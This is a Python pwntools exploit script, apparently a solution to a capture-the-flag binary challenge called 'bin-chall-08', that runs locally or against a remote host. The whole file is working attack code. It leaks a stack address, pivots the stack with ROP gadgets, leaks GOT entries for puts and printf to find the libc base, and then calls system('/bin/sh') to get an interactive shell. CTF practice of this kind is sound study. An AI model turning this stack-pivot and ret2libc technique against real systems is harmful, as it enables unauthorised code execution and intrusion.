#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bin-chall-08")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

ret = 0x40101a
pop_rdi = 0x401343
pop_rax = 0x4011a1
pivot_gadget = 0x40119e

printf_got = elf.got["printf"]
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
main = elf.symbols["main"]


pad = 0x60 + 0x8


def pivot():
    io.recvuntil(b"address: ")

    # [rbp-0x20]
    stack_leak = int(io.recvline(keepends=False), 16)
    pivot_addr = stack_leak + 0x20 - 0xa0
    pivot_payload = b"A" * pad
    pivot_payload += flat(pop_rax, pivot_addr)
    pivot_payload += flat(pivot_gadget)

    io.sendafter(b"Input 1: ", pivot_payload)


def leak(got_addr: int) -> int:
    pivot()

    payload = flat(pop_rdi, got_addr, puts_plt)
    payload += flat(ret, main)

    io.sendafter(b"Input 2: ", payload)

    leak_addr = u64(io.recv(6).ljust(8, b"\x00"))
    return leak_addr


pause()
leak_puts = leak(puts_got)
log.info(f"{leak_puts=:#x}")

leak_printf = leak(printf_got)
log.info(f"{leak_printf=:#x}")

log.info(f"puts {leak_puts:#x} printf {leak_printf:#x}")

libc = ELF("./libc.so")
libc.address = leak_puts - libc.symbols["puts"]

log.info(f"{libc.address=:#x}")

system = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

pivot()

payload = flat(pop_rdi, bin_sh)
payload += flat(system)

io.sendafter(b"Input 2: ", payload)

io.interactive()
